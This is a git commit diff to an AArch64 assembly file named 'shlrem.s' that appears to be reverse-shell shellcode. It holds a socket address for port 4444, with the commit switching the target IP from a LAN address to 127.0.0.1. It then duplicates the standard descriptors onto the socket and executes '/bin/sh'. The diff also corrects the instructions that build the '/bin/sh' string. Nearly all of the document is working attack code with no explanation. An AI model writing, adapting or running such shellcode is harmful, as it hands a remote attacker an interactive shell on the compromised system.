6efbece61123d8d325be572fd6a3f790cfca2fdb
Pavel Anguiano <50802374+BGPavelAng@users.noreply.github.com>
2021-11-24 17:02:24 -0600

    Update shlrem.s

--- shlrem.s
+++ shlrem.s
@@ -1,7 +1,9 @@
 ;//////////Codigo por Belial Grimoire////////////
 ;/////bgpavelang.github.io//////
 
+
 .arch armv8-a
+
 .global _start
 
 
@@ -22,28 +24,29 @@ mov x2, 16
 
 movz x1, 0x2
 movk x1, 0x5c11, lsl 16
-movk x1, 0xa8c0, lsl 32
-movk x1, 0x1300, lsl 48
+movk x1, 0x007f, lsl 32
+movk x1, 0x0001, lsl 48
 
 str x1, [sp, -16]!
 mov x1, sp
 svc 0
 
 mov x1, 3
+mov x8, 24
 
 jp_dup:
-mov x8, 24
+mov x2, xzr
+mov w0, w3
 svc 0
-sub x1, x1, 1
+subs x1, x1, 1
 bne jp_dup
 
 mov x8, 221
-movz x1, 0x622f
-movk x1, 0x6e69
-movk x1, 0x732f
-movk x1, 0x0068
-str x1, [sp, -16]!
+movz x0, 0x622f
+movk x0, 0x6e69, lsl 16
+movk x0, 0x732f, lsl 32
+movk x0, 0x0068, lsl 48
+str x0, [sp]
 mov x0, sp
 
 svc 0
-
